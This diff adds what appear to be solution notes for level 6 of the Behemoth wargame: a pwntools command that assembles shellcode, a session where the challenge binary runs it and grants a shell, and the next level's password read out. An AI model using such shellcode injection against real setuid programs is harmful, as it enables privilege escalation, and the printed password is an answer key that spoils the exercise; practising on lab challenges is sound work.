@@ -1,0 +1,13 @@
+python -c "from pwn import *; print asm(shellcraft.echo('HelloKitty'))" > shellcode.txt
+
+behemoth6@behemoth:/tmp/tmp.7cDnX5gJAP$ /behemoth/behemoth6
+Incorrect output.
+behemoth6@behemoth:/tmp/tmp.7cDnX5gJAP$ chmod 755 shellcode.txt
+behemoth6@behemoth:/tmp/tmp.7cDnX5gJAP$ chmod 755 /tmp/tmp.7cDnX5gJAP
+behemoth6@behemoth:/tmp/tmp.7cDnX5gJAP$ /behemoth/behemoth6
+Segmentation fault
+Correct.
+$ cat /etc/behemoth_pass/behemoth7
+baquoxuafo
+$ exit
+
